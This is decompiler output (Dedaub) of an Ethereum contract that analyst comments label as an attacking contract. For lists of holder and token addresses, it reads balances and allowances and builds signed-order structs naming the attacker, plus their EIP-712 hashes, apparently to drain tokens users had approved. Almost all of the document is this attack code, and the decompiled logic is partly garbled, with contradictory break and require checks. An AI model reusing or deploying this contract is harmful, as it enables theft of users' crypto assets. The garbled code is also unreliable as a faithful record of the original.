// Decompiled by library.dedaub.com
// 2022.12.02 07:04 UTC

// Data structures and variables inferred from the use of storage instructions
uint256 stor_1; // STORAGE[0x1]
uint256 _test; // STORAGE[0x2] bytes 4 to 31


function _SafeSub(uint256 varg0, uint256 varg1) private { 
    require(varg0 >= varg1, Panic(17));
    return varg0 - varg1;
}

function 0x149e(uint256 varg0) private { 
    require(varg0 == varg0);
    return ;
}

function () public payable { 
    revert();
}

function supportsInterface(bytes4 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0 & 0xffffffff00000000000000000000000000000000000000000000000000000000);
    v0 = v1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff & varg0 == 0xffffffff00000000000000000000000000000000000000000000000000000000;
    if (~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff & varg0 != 0xffffffff00000000000000000000000000000000000000000000000000000000) {
        v0 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff & varg0 == 0x80ac58cd00000000000000000000000000000000000000000000000000000000;
    }
    if (!v0) {
        v2 = v3 = 1;
    } else {
        v2 = v4 = 0;
    }
    return v2;
}

function 0xa07bb134(uint256 varg0, uint256 varg1, uint256 varg2) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 96);
    require(varg0 == address(varg0));
    require(varg1 <= 0xffffffffffffffff);
    require(4 + varg1 + 31 < 4 + (msg.data.length - 4));
    v0 = v1 = varg1.length;
    require(v1 <= 0xffffffffffffffff);
    require(4 + varg1 + 32 + (v1 << 5) <= 4 + (msg.data.length - 4));
    require(varg2 <= 0xffffffffffffffff);
    require(4 + varg2 + 31 < 4 + (msg.data.length - 4));
    require(varg2.length <= 0xffffffffffffffff);
    require(4 + varg2 + 32 + (varg2.length << 5) <= 4 + (msg.data.length - 4));
    require(v1 <= 0xffffffffffffffff, Panic(65));
    v2 = new uint256[](v1);
    if (v1) {
        v3 = v2.data;
        do {
            MEM[MEM[64]] = 0;
            MEM[32 + MEM[64]] = 0;
            MEM[64 + MEM[64]] = 0;
            MEM[96 + MEM[64]] = 0;
            MEM[128 + MEM[64]] = 0;
            MEM[160 + MEM[64]] = 0;
            MEM[192 + MEM[64]] = 0;
            MEM[224 + MEM[64]] = 0;
            MEM[256 + MEM[64]] = 0;
            MEM[v3] = MEM[64];
            v3 += 32;
            v0 = v0 - 1;
        } while (!v0);
    }
    require(v1 <= 0xffffffffffffffff, Panic(65));
    v4 = new uint256[](v1);
    if (v1) {
        CALLDATACOPY(v4.data, msg.data.length, v1 << 5);
    }
    require(v1 <= 0xffffffffffffffff, Panic(65));
    v5 = new uint256[](v1);
    if (v1) {
        CALLDATACOPY(v5.data, msg.data.length, v1 << 5);
    }
    v6 = v7 = 0;
    while (v6 < v1) {
        if (v6 < varg2.length) {
            break;
        }
        require(v6 < varg2.length, Panic(50));
        if ((v6 << 5) + (4 + varg2 + 32) + 32 - ((v6 << 5) + (4 + varg2 + 32)) >= 32) {
            break;
        }
        require((v6 << 5) + (4 + varg2 + 32) + 32 - ((v6 << 5) + (4 + varg2 + 32)) >= 32);
        if (msg.data[(v6 << 5) + (4 + varg2 + 32) + 0] == address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0])) {
            break;
        }
        require(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0] == address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0]));
        if (v6 < v1) {
            break;
        }
        require(v6 < v1, Panic(50));
        if ((v6 << 5) + (4 + varg1 + 32) + 32 - ((v6 << 5) + (4 + varg1 + 32)) >= 32) {
            break;
        }
        require((v6 << 5) + (4 + varg1 + 32) + 32 - ((v6 << 5) + (4 + varg1 + 32)) >= 32);
        require(msg.data[(v6 << 5) + (4 + varg1 + 32) + 0] == address(msg.data[(v6 << 5) + (4 + varg1 + 32) + 0]));
        require((address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0])).code.size);
        v8, v9 = address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0]).balanceOf(address(msg.data[(v6 << 5) + (4 + varg1 + 32) + 0])).gas(msg.gas);
        require(v8); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x149e(v9);
        require((address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0])).code.size);
        v10, v9 = address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0]).allowance(address(msg.data[(v6 << 5) + (4 + varg1 + 32) + 0]), address(varg0)).gas(msg.gas);
        require(v10); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        0x149e(v9);
        if (v9 <= v9) {
        }
        require(v6 < v5.length, Panic(50));
        v5[v6] = v9;
        // attacker address
        MEM[MEM[64]] = msg.sender;
        // attacking contract address
        MEM[32 + MEM[64]] = address(this);
        MEM[64 + MEM[64]] = 1;
        MEM[96 + MEM[64]] = 0;
        v11 = _SafeSub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, 1);
        MEM[128 + MEM[64]] = v11;
        MEM[160 + MEM[64]] = v9;
        MEM[192 + MEM[64]] = 1;
        v12 = _SafeSub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, 1);
        MEM[224 + MEM[64]] = v12;
        require(v6 < varg2.length, Panic(50));
        require((v6 << 5) + (4 + varg2 + 32) + 32 - ((v6 << 5) + (4 + varg2 + 32)) >= 32);
        require(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0] == address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0]));
        MEM[256 + MEM[64]] = address(msg.data[(v6 << 5) + (4 + varg2 + 32) + 0]);
        require(v6 < v2.length, Panic(50));
        v2[v6] = MEM[64];
        require(v6 < v2.length, Panic(50));
        v13 = new struct(11);
        v13.word1 = 0x64eb4af5450e5310cebd7bb2ff5d276bdea51574927b51bbad8df4c2626988cf;
        v13.word2 = address(MEM[0 + v2[v6]]);
        v13.word3 = address(MEM[32 + v2[v6]]);
        v13.word4 = MEM[64 + v2[v6]];
        v13.word5 = MEM[96 + v2[v6]];
        v13.word6 = MEM[128 + v2[v6]];
        v13.word7 = MEM[160 + v2[v6]];
        v13.word8 = MEM[192 + v2[v6]];
        v13.word9 = MEM[224 + v2[v6]];
        v13.word10 = address(MEM[256 + v2[v6]]);
        v13.word0 = 320;
        v14 = v13.word0;
        // calculate hash which will be judged later
        v15 = keccak256(0x64eb4af5450e5310cebd7bb2ff5d276bdea51574927b51bbad8df4c2626988cf, address(MEM[0 + v2[v6]]), address(MEM[32 + v2[v6]]), MEM[64 + v2[v6]], MEM[96 + v2[v6]], MEM[128 + v2[v6]], MEM[160 + v2[v6]], MEM[192 + v2[v6]], MEM[224 + v2[v6]], address(MEM[256 + v2[v6]]));
        require(v6 < v4.length, Panic(50));
        v4[v6] = keccak256(0x1901000000000000000000000000000000000000000000000000000000000000, stor_1, v15);
        require(v6 != 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, Panic(17));
        v6 = v6 + 1;
    }
    v16 = new array[](v2.length);
    v17 = v18 = v16.data;
    v19 = v20 = v2.data;
    v21 = v22 = 0;
    while (v21 < v2.length) {
        MEM[v17 + 0] = address(MEM[MEM[v19] + 0]);
        MEM[v17 + 32] = address(MEM[MEM[v19] + 32]);
        MEM[v17 + 64] = MEM[MEM[v19] + 64];
        MEM[v17 + 96] = MEM[MEM[v19] + 96];
        MEM[v17 + 128] = MEM[MEM[v19] + 128];
        MEM[v17 + 160] = MEM[MEM[v19] + 160];
        MEM[v17 + 192] = MEM[MEM[v19] + 192];
        MEM[v17 + 224] = MEM[MEM[v19] + 224];
        MEM[v17 + 256] = address(MEM[MEM[v19] + 256]);
        v17 = v17 + 288;
        v19 = v19 + 32;
        v21 = v21 + 1;
    }
    v17 = new array[](v4.length);
    v23 = v24 = v17.data;
    v25 = v26 = v4.data;
    v27 = v28 = 0;
    while (v27 < v4.length) {
        MEM[v23] = MEM[v25];
        v23 = v23 + 32;
        v25 = v25 + 32;
        v27 = v27 + 1;
    }
    v23 = new array[](v5.length);
    v29 = v30 = v23.data;
    v31 = v32 = v5.data;
    v33 = v34 = 0;
    while (v33 < v5.length) {
        MEM[v29] = MEM[v31];
        v29 = v29 + 32;
        v31 = v31 + 32;
        v33 = v33 + 1;
    }
    return v16, v17, v23;
}

function 0x8ab(uint256 varg0, uint256 varg1) private { 
    v0 = varg0 & 0xffffffff00000000000000000000000000000000000000000000000000000000;
    v1 = v2 = 0;
    while (v1 < 36) {
        MEM[MEM[64] + v1] = MEM[MEM[64] + 32 + v1];
        v1 = v1 + 32;
    }
    if (v1 > 36) {
        MEM[MEM[64] + 36] = 0;
    }
    v3 = v4, v5, v6 = address(varg1).supportsInterface(v0).gas(30000);
    if (RETURNDATASIZE() == 0) {
        v7 = v8 = 96;
    } else {
        v7 = v9 = new bytes[](RETURNDATASIZE());
        v5 = v9.data;
        RETURNDATACOPY(v5, 0, RETURNDATASIZE());
    }
    if (MEM[v7] >= 32) {
        if (v4) {
            require(v6 + MEM[v7] - v6 >= 32);
            v3 = MEM[v6 + 0];
            require(v3 == v3);
        }
    } else {
        v3 = v10 = 0;
    }
    return v3;
}

function safeTransferFrom(address varg0, address varg1, uint256 varg2, uint256 varg3, bytes varg4) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 160);
    require(varg0 == varg0);
    require(varg1 == varg1);
    0x149e(varg2);
    0x149e(varg3);
    require(varg4 <= 0xffffffffffffffff);
    require(4 + varg4 + 31 < 4 + (msg.data.length - 4));
    require(varg4.length <= 0xffffffffffffffff);
    require(4 + varg4 + 32 + varg4.length <= 4 + (msg.data.length - 4));
}

function test() public payable { 
    v0 = v1 = 0x8ab(0x1ffc9a700000000000000000000000000000000000000000000000000000000, address(this));
    if (v1) {
        v2 = 0x8ab(0xffffffff00000000000000000000000000000000000000000000000000000000, address(this));
        v0 = v3 = !v2;
    }
    if (v0) {
        v0 = v4 = 0x8ab(_test << 224, address(this));
    }
    return v0;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    require(!msg.value);
    if (msg.data.length >= 4) {
        if (0x1ffc9a7 == function_selector >> 224) {
            supportsInterface(bytes4);
        } else if (0xa07bb134 == function_selector >> 224) {
            0xa07bb134();
        } else if (0xf242432a == function_selector >> 224) {
            safeTransferFrom(address,address,uint256,uint256,bytes);
        } else if (0xf8a8fd6d == function_selector >> 224) {
            test();
        }
    }
    ();
}
